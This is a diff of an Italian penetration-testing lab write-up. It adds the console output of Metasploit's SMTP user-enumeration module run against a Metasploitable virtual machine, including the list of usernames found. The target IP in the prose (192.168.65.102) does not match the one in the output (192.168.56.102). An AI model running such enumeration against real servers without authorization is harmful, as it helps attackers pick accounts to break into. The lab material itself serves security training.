@@ -84,7 +84,12 @@ Module options (auxiliary/scanner/smtp/smtp_enum):
 Va quindi inserito solo l'indirizzo della macchina target, digitando il comando `set RHOSTS 192.168.65.102` e siamo pronti a lanciare l'exploit.
 
 ```
+msf6 auxiliary(scanner/smtp/smtp_enum) > exploit
 
+[*] 192.168.56.102:25     - 192.168.56.102:25 Banner: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
+[+] 192.168.56.102:25     - 192.168.56.102:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data
+[*] 192.168.56.102:25     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
 ```
-
+Abbiamo quindi scoperto una lunga lista di nomi utente presenti sulla macchina target.
 
